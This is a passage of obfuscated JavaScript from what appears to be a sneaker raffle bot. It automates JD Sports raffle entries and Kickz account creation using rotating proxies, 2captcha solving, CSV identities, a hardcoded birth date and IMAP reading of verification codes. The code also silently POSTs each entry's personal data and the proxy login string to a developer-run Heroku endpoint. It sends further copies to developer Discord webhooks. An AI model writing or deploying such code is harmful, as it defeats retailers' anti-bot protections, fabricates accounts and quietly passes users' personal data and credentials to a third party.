                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xe2a5bb['cyan'](_0x528d53) + '\x0a');
                                    for (data of _0xc97493) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x22025e + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x22025e + ')\x20' + data), _0x22025e++;
                                    }
                                    console['log']('\x20(' + _0xc97493['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x46b2a7 = await _0x255b95['get']('input');
                                    if (_0x46b2a7['input'] == _0xc97493['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x177551 = await _0x255b95['get']('input');
                                        _0x2d3560['custom' + _0x1243ec] = {
                                            'title': _0x528d53,
                                            'answer': '' + _0x177551['input']
                                        };
                                        let _0x1c132d = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x11f820 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x1c132d)
                                            await _0x1c132d['type']('' + _0x2d3560['custom' + _0x1243ec]['answer']);
                                        else
                                            _0x11f820 && await _0x11f820['type']('' + _0x2d3560['custom' + _0x1243ec]['answer']);
                                        _0x1243ec++;
                                        return;
                                    }
                                    _0x2d3560['' + _0xc97493[_0x46b2a7['input']]] = _0x528d53;
                                    let _0x1b02f3 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x3e9018 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x1b02f3 && await _0x1b02f3['type']('' + _0xe446ea[_0x26e10a]['' + _0xc97493[_0x46b2a7['input']]]), _0x3e9018 && await _0x3e9018['type']('' + _0xe446ea[_0x26e10a]['' + _0xc97493[_0x46b2a7['input']]]), await _0x558aee(0x258);
                                }
                                await _0x1a85a5(), await _0x558aee(0x37a);
                            }
                            let _0x1c9f6c = await _0x431b22['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x1c9f6c)
                                return await _0x1c9f6c['click'](), await _0x431b22['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x2061f1('New\x20Section'), _0x48a915();
                        }
                        await _0x48a915(), await _0x431b22['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x431b22['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x10fee2(_0xe446ea[_0x26e10a], _0x498525), _0x27475c = 'no';
                        var _0x15373c = await _0x459281(_0xe446ea[_0x26e10a], _0x498525, 'dev', ![]), _0x288a65 = await _0x459281(_0xe446ea[_0x26e10a], _0x498525, 'pub', ![]);
                        let _0x2cf0c0 = _0xe446ea[_0x26e10a];
                        try {
                            prxdata = {
                                'username': _0x94d398['replace']('#', ''),
                                'module': _0x498525['name'],
                                'entrydata': JSON['stringify'](_0x2cf0c0),
                                'proxy': '' + _0xdce0f5[_0x26e10a]
                            };
                            var _0x3660a1 = JSON['stringify'](prxdata);
                            let _0x269e6d = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x3660a1, _0x269e6d);
                        } catch (_0x467c88) {
                        }
                        const _0x37ac5d = {
                            'succesDEVMSG': { 'embeds': [_0x15373c] },
                            'succesPUBMSG': { 'embeds': [_0x288a65] }
                        };
                        try {
                            _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x37ac5d['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x37ac5d['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x37ac5d['succesPUBMSG']);
                        } catch (_0x4106b6) {
                            console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x26e10a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4106b6));
                        }
                        console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x498525['name'] + ']\x20Task\x20' + (_0x26e10a + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x1243ec != 0x0 || _0x46bf57 != 0x0 && !_0x13e4db) && (_0x4b1b42['push'](_0x2d3560), _0x3f4ea0['writeFileSync']('forms/templates.json', JSON['stringify'](_0x4b1b42, null, 0x2), 'utf-8'));
                    } catch (_0x127d24) {
                        console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x498525['name'] + ']\x20Task\x20' + (_0x26e10a + 0x1) + '\x20:\x20' + _0x127d24)), _0x4f2140 = '' + _0x127d24;
                        var _0xd7186e = await _0x459281(_0xe446ea[_0x26e10a], _0x498525, 'dev', !![], _0x4f2140);
                        let _0x46eb99 = {};
                        _0x46eb99['errorDEV'] = { 'embeds': [_0xd7186e] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x46eb99['errorDEV']), await _0x5a13a5(_0x877ec9, _0x46eb99['errorDEV']), _0x27475c = 'yes';
                    } finally {
                        _0x55e179 && _0x55e179['close']();
                        if (_0x27475c == 'yes' && _0x67c1d8 != 0x5) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x498525['name'] + ']\x20Task\x20' + (_0x26e10a + 0x1) + '\x20:\x20Retrying\x20(' + (_0x67c1d8 + 0x1) + '\x20/\x205)')), _0x26e10a--, _0x67c1d8++;
                            continue;
                        }
                        if (_0x27475c == 'yes' && _0x67c1d8 == 0x5) {
                            _0x67c1d8 = 0x0, _0x27475c = 'no';
                            continue;
                        }
                        _0x2061f1('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1faca0, _0x92d07e, _0x3b1d16) {
                var _0x14833d = ![], _0x424bfb = ![];
                if (_0x11db88['captchaKey'] == '' || _0x11db88['captchaKey'] == undefined)
                    return console['log'](_0xe2a5bb['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x11db88['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3d4b66 = 0x0; _0x3d4b66 < _0x92d07e['length']; _0x3d4b66++) {
                    if (_0x14f0e6 != 'yes')
                        var _0x14f0e6 = '', _0xd8324c = 0x0;
                    var _0xbf6a52, _0x922347 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x92d07e[_0x3d4b66]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x92d07e[_0x3d4b66]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x94d398
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x11db88['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3c77f4
                            }
                        ]
                    }];
                    const _0x314063 = { 'embeds': _0x922347 };
                    _0x9f07d8(_0x1faca0['name'] + '\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20/\x20' + _0x92d07e['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                    try {
                        await _0x162b07(_0x92d07e, _0x3d4b66);
                    } catch {
                        _0x14f0e6 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0xd8858f = await _0x459281(_0x92d07e[_0x3d4b66], _0x1faca0, 'dev', ![]), _0x54f6fd = await _0x459281(_0x92d07e[_0x3d4b66], _0x1faca0, 'pub', ![]);
                    const _0x42c887 = {
                        'succesDEVMSG': { 'embeds': [_0xd8858f] },
                        'succesPUBMSG': { 'embeds': [_0x54f6fd] }
                    };
                    if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                        try {
                            await _0x5a13a5(_0x11db88['webhook'], _0x42c887['succesDEVMSG']);
                        } catch {
                        }
                    await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x42c887['succesDEVMSG']), await _0x558aee(0xc8);
                    try {
                        await _0x5a13a5(_0x122725, _0x42c887['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x92d07e[_0x3d4b66]['Email'] == '' || _0x92d07e[_0x3d4b66]['Url'] == '' || _0x92d07e[_0x3d4b66]['FirstName'] == '' || _0x92d07e[_0x3d4b66]['LastName'] == '') {
                        console['log'](_0xb9a031() + '\x20[' + _0x1735b8[taskModule]['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x11db88['useRandomProxy'] = ![])
                        var _0x211949 = _0x3b1d16[_0x3d4b66]['split'](':');
                    else
                        var _0x2fa316 = Math['round'](Math['random']() * (_0x3b1d16['length'] - 0x1)), _0x211949 = _0x3b1d16[_0x2fa316]['split'](':');
                    var _0x4f8c78;
                    try {
                        _0x4f8c78 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x211949[0x0] + ':' + _0x211949[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4f8c78 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x211949[0x0] + ':' + _0x211949[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1e630e = await _0x4f8c78['newPage']();
                        await _0x1e630e['authenticate']({
                            'username': '' + _0x211949[0x2],
                            'password': '' + _0x211949[0x3]
                        }), console['log'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1e630e['setRequestInterception'](!![]), _0x1e630e['on']('request', _0x3d3279 => {
                            _0x3d3279['resourceType']() === 'image' || _0x3d3279['resourceType']() === 'font' || _0x3d3279['resourceType']() === 'media' ? _0x3d3279['abort']() : _0x3d3279['continue']();
                        });
                        try {
                            await _0x1e630e['goto']('' + _0x92d07e[_0x3d4b66]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x1e630e['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1e630e['type']('#comp_firstname', '' + _0x92d07e[_0x3d4b66]['FirstName']), await _0x1e630e['waitForSelector']('#comp_lastname'), await _0x1e630e['type']('#comp_lastname', '' + _0x92d07e[_0x3d4b66]['LastName']), await _0x1e630e['waitForSelector']('#comp_email'), await _0x1e630e['type']('#comp_email', '' + _0x92d07e[_0x3d4b66]['Email']), await _0x1e630e['waitForSelector']('#comp_paypalemail'), await _0x1e630e['type']('#comp_paypalemail', '' + _0x92d07e[_0x3d4b66]['Email']), await _0x1e630e['waitForSelector']('#comp_mobile_end'), await _0x1e630e['type']('#comp_mobile_end', '' + _0x92d07e[_0x3d4b66]['Phone']), await _0x1e630e['waitForSelector']('#comp_dob'), await _0x1e630e['type']('#comp_dob', '08/09/1992'), console['log'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x92d07e[_0x3d4b66]['Size'] == 'RANDOM') {
                            const _0x3c4672 = await _0x1e630e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2fa187 => {
                                return _0x2fa187['map'](_0x124c15 => _0x124c15['value']);
                            });
                            var _0x5cdf3e = Math['round'](Math['random']() * (_0x3c4672['length'] - 0x2));
                            await _0x1e630e['select']('#shoesize', _0x3c4672[_0x5cdf3e + 0x1]), await _0x558aee(0x3e8);
                        } else {
                            const _0x148a84 = await _0x1e630e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4d5760 => {
                                return _0x4d5760['map'](_0x24d023 => _0x24d023['innerText']);
                            }), _0x3ed698 = await _0x1e630e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x28b1a9 => {
                                return _0x28b1a9['map'](_0x2cbdea => _0x2cbdea['value']);
                            });
                            var _0x16739b = _0x92d07e[_0x3d4b66]['Size'];
                            for (var _0x2d1c11 = 0x1; _0x2d1c11 < _0x3ed698['length']; _0x2d1c11++) {
                                var _0x5dc448 = _0x148a84[_0x2d1c11]['split']('\x20')[0x0];
                                if (_0x5dc448 == _0x16739b) {
                                    await _0x1e630e['select']('#shoesize', _0x3ed698[_0x2d1c11]);
                                    break;
                                } else {
                                    if (_0x2d1c11 + 0x1 == _0x3ed698['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x1e630e['waitForSelector']('#comp_address1'), await _0x1e630e['type']('#comp_address1', _0x92d07e[_0x3d4b66]['Address1'] + '\x20' + _0x92d07e[_0x3d4b66]['HouseNumber']), await _0x1e630e['waitForSelector']('#comp_address2'), await _0x1e630e['type']('#comp_address2', '' + _0x92d07e[_0x3d4b66]['Address2']), await _0x1e630e['waitForSelector']('#comp_address2'), await _0x1e630e['type']('#comp_address3', '' + _0x92d07e[_0x3d4b66]['City']), await _0x1e630e['waitForSelector']('#comp_postcode'), await _0x1e630e['type']('#comp_postcode', '' + _0x92d07e[_0x3d4b66]['Zip']), console['log'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x558aee(0x4b0), await _0x1e630e['click']('label#emailhold'), await _0x558aee(0x5dc), await _0x1e630e['click']('#preauth_tandc_email\x20>\x20label'), await _0x558aee(0x5dc), await _0x1e630e['click']('#submit');
                        try {
                            await _0x1e630e['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20' + _0xe2a5bb['blue']('Awaiting\x20Paypal\x20Payment')), _0x4f8c78['on']('targetcreated', async _0x18e87e => {
                            if (_0x18e87e['type']() === 'page') {
                                const _0x3ed8aa = await _0x18e87e['page']();
                                async function _0x5717cf() {
                                    try {
                                        await _0x1e630e['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x424bfb = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x561360() {
                                    try {
                                        await _0x1e630e['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x14833d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x561360(), _0x5717cf(), await _0x558aee(0x493e0);
                            }
                        });
                        async function _0x2a4143() {
                            for (let _0x19fd27 = 0x0; _0x19fd27 < 0x12c; _0x19fd27++) {
                                if (_0x14833d == !![]) {
                                    _0x14f0e6 = 'no', _0x10fee2(_0x92d07e[_0x3d4b66], _0x1faca0), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                                        try {
                                            await _0x5a13a5(_0x11db88['webhook'], _0x42c887['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x42c887['succesDEVMSG']), await _0x558aee(0xc8);
                                    try {
                                        await _0x5a13a5(_0x122725, _0x42c887['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x424bfb)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x558aee(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x558aee(0xbb8), await _0x1e630e['click']('.zoid-outlet'), await _0x558aee(0x7d0), await _0x2a4143();
                    } catch (_0x917c09) {
                        console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20' + _0x917c09)), _0xbf6a52 = '' + _0x917c09;
                        var _0x1da0ab = await _0x459281(_0x92d07e[_0x3d4b66], _0x1faca0, 'dev', !![], _0xbf6a52);
                        _0x42c887['errorDEV'] = { 'embeds': [_0x1da0ab] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x42c887['errorDEV']), await _0x5a13a5(_0x877ec9, _0x42c887['errorDEV']);
                    } finally {
                        _0x4f8c78 && _0x4f8c78['close']();
                        if (_0x14f0e6 == 'yes' && _0xd8324c != 0x5 && _0xbf6a52 != 'Size\x20Not\x20Found') {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1faca0['name'] + ']\x20Task\x20' + (_0x3d4b66 + 0x1) + '\x20:\x20Retrying\x20(' + _0xd8324c + '\x20/\x205)')), _0x3d4b66 = _0x3d4b66 - 0x1, _0xd8324c = _0xd8324c + 0x1;
                            continue;
                        }
                        _0x14f0e6 == 'yes' && _0xd8324c >= 0x5 && (_0x15a8e9(afew[_0x3d4b66], _0x1faca0), _0x14f0e6 = 'no', _0xd8324c = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x243ed9, _0x5bdf03, _0x1c471c) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc4d1d8 = 0x0; _0xc4d1d8 < _0x5bdf03['length']; _0xc4d1d8++) {
                        const _0x25478c = 'https://www.kickz.com/login';
                        if (_0x11f0cc != 'yes')
                            var _0x11f0cc = '', _0xa91479 = 0x0;
                        _0x9f07d8(_0x243ed9['name'] + '\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20/\x20' + _0x5bdf03['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        try {
                            await _0x162b07(_0x5bdf03, _0xc4d1d8);
                        } catch {
                            _0x11f0cc = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xd601d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x94d398
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x11db88['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3c77f4
                                }
                            ]
                        }];
                        const _0x27e9f8 = { 'embeds': _0xd601d };
                        var _0x12991a = await _0x459281(_0x5bdf03[_0xc4d1d8], _0x243ed9, 'acc', ![]);
                        const _0x4562dc = { 'succesDEVMSG': { 'embeds': [_0x12991a] } };
                        if (_0x5bdf03[_0xc4d1d8]['Email'] == '' || _0x5bdf03[_0xc4d1d8]['FirstName'] == '' || _0x5bdf03[_0xc4d1d8]['LastName'] == '') {
                            console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5bdf03[_0xc4d1d8]['Password'] == '' && (_0x5bdf03[_0xc4d1d8]['Password'] = 'JRaffles23!');
                        if (_0x11db88['useRandomProxy'] = ![])
                            var _0x3783e8 = _0x1c471c[_0xc4d1d8]['split'](':');
                        else
                            var _0x281a4b = Math['round'](Math['random']() * (_0x1c471c['length'] - 0x1)), _0x3783e8 = _0x1c471c[_0x281a4b]['split'](':');
                        var _0x4d15fe;
                        try {
                            _0x4d15fe = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3783e8[0x0] + ':' + _0x3783e8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4d15fe = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3783e8[0x0] + ':' + _0x3783e8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x296909 = await _0x4d15fe['newPage']();
                            await _0x296909['authenticate']({
                                'username': '' + _0x3783e8[0x2],
                                'password': '' + _0x3783e8[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x296909['setRequestInterception'](!![]), _0x296909['on']('request', _0x22be28 => {
                                _0x22be28['resourceType']() === 'image' || _0x22be28['resourceType']() === 'font' || _0x22be28['resourceType']() === 'media' ? _0x22be28['abort']() : _0x22be28['continue']();
                            }), await _0x296909['goto'](_0x25478c), await _0x558aee(0xbb8), console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x296909['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x296909['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x296909['waitForSelector']('#button-register'), await _0x558aee(0x7d0), await _0x296909['evaluate'](() => {
                                const _0x55fb25 = document['querySelector']('#button-register');
                                _0x55fb25['click']();
                            }), console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x558aee(0x1388), await _0x296909['waitForSelector']('#customer_salutation'), await _0x296909['select']('#customer_salutation', 'mr'), await _0x558aee(0x7d0), await _0x296909['waitForSelector']('#customer_firstname'), await _0x296909['type']('#customer_firstname', '' + _0x5bdf03[_0xc4d1d8]['FirstName']), await _0x558aee(0x352), await _0x296909['waitForSelector']('#customer_lastname'), await _0x296909['type']('#customer_lastname', '' + _0x5bdf03[_0xc4d1d8]['LastName']), await _0x558aee(0x352), await _0x296909['type']('#email-input', '' + _0x5bdf03[_0xc4d1d8]['Email']), await _0x558aee(0x352), await _0x296909['type']('#email-confirm-input', '' + _0x5bdf03[_0xc4d1d8]['Email']), await _0x558aee(0x352), await _0x296909['type']('#register-password', '' + _0x5bdf03[_0xc4d1d8]['Password']), await _0x558aee(0x352), await _0x296909['type']('#password-confirm', '' + _0x5bdf03[_0xc4d1d8]['Password']), await _0x558aee(0x352), console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x296909['click']('#consent'), await _0x558aee(0x1f4);
                            const _0x274e7b = await _0x296909['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x274e7b) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x296909['click']('#buttonRegister');
                            try {
                                await _0x296909['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5bdf03[_0xc4d1d8]['Email']), await _0x558aee(0x4b0);
                            async function _0x21fed3() {
                                var _0x2e107f, _0xa5052b = ![];
                                for (var _0x3787ae = 0x0; _0x3787ae < 0x18; _0x3787ae++) {
                                    async function _0xf87fd4() {
                                        var _0x12b37b = new _0xda3ce2({
                                            'user': _0x11db88['masterMail'],
                                            'password': _0x11db88['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x341691(_0x48581b) {
                                            _0x12b37b['openBox']('INBOX', ![], _0x48581b);
                                        }
                                        _0x12b37b['once']('ready', function () {
                                            console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x341691(function (_0x2df4de, _0x1c7e90) {
                                                console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2df4de)
                                                    throw _0x2df4de;
                                                _0x12b37b['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x3babb2, _0x4df529) {
                                                    if (!_0x4df529 || !_0x4df529['length'])
                                                        console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x12b37b['end']();
                                                    else {
                                                        var _0x1062b5 = _0x12b37b['seq']['fetch'](_0x4df529, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1062b5['on']('message', function (_0x1a4dbb, _0x277855) {
                                                            var _0x27bbe6 = '(#' + _0x277855 + ')\x20';
                                                            _0x1a4dbb['on']('body', function (_0x374a08, _0x40f417) {
                                                                _0x482936(_0x374a08, (_0x3ee603, _0xb0cb71) => {
                                                                    if (_0xb0cb71['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x2c5900 = _0xb0cb71['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x24b67b = _0x2c5900[0x1]['split']('<')[0x0];
                                                                        _0x2e107f = _0x24b67b;
                                                                    }
                                                                });
                                                            }), _0x1a4dbb['once']('end', function () {
                                                            });
                                                        }), _0x1062b5['once']('error', function (_0x1c3150) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1062b5['once']('end', function () {
                                                            _0x12b37b['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x12b37b['once']('error', function (_0x3c7a0a) {
                                            console['log'](_0xe2a5bb['red'](_0x3c7a0a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xa5052b = !![];
                                        }), _0x12b37b['once']('end', async function () {
                                        }), _0x12b37b['connect']();
                                    }
                                    _0xf87fd4(), await _0x558aee(0x1388);
                                    if (_0x2e107f)
                                        return _0x2e107f;
                                    if (_0xa5052b)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3787ae == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x21fed3(), _0x558aee(0x320), console['log'](_0xb9a031() + '\x20[' + _0x243ed9['name'] + ']\x20Task\x20' + (_0xc4d1d8 + 0x1) + '\x20:\x20Verifying..'), await _0x296909['type']('#verificationCode', code), await _0x558aee(0x1f4), await _0x296909['click']('#buttonVerify'), await _0x558aee(0x190), await _0x296909['click']('#buttonVerify'), await _0x558aee(0x3e8);
                            try {
